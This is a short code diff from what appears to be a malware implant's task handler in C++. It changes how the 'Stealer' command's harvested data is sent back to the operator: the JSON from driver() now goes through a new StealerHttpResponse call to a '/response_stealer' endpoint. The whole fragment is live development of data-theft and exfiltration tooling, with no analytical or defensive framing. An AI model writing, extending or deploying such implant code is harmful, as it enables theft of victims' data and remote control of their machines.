@@ -114,11 +114,11 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
             json data_from_driver;
             printf("Executing Stealer\n");
             data_from_driver = driver();
-            results = data_from_driver.dump(); 
+            //results = data_from_driver.dump(); 
 
             printf("WE GOT RESULTS \n");             
 
-            HttpResponse("/response_stealer", implant_id, task_id, results, "success", command);
+            StealerHttpResponse("/response_stealer", implant_id, task_id, data_from_driver, "success", command);
 
             printf("SENT SUCCESS \n");
         }
